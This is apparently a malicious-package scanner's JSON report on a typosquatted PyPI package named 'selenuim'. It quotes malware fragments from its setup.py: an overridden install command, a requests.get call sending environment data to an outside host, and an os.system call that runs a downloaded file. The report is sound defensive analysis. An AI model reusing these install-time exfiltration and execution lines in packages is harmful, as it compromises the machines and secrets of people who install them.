@@ -1,0 +1,36 @@
+{
+    "issues": 3,
+    "errors": {},
+    "results": {
+        "dll-hijacking": {},
+        "download-executable": {},
+        "shady-links": {},
+        "cmd-overwrite": [
+            {
+                "location": "setup.py:26",
+                "code": "setup(\n  name='selenuim',\n  version='4.4.2',\n  description='A very basic firstbasicpyapp!',\n  python_requires=\">=3.6\",\n  install_requires=[''],\n  tests_require=[],\n  cmdclass={'install': PostInstallCommand},\n)",
+                "message": "This package is overwriting the 'install' command in setup.py"
+            }
+        ],
+        "exfiltrate-sensitive-data": [
+            {
+                "location": "setup.py:10",
+                "code": "        t = requests.get(\"https://linkedopports.com/pyp/resp.php?live=Installation \" +env)\n",
+                "message": "This package is exfiltrating sensitive data to a remote server"
+            }
+        ],
+        "obfuscation": {},
+        "steganography": {},
+        "silent-process-execution": {},
+        "clipboard-access": {},
+        "code-execution": [
+            {
+                "location": "setup.py:16",
+                "code": "            os.system('start '+filename)\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            }
+        ],
+        "exec-base64": {}
+    },
+    "path": "./dataset/pypi/selenuim-4.4.2"
+}
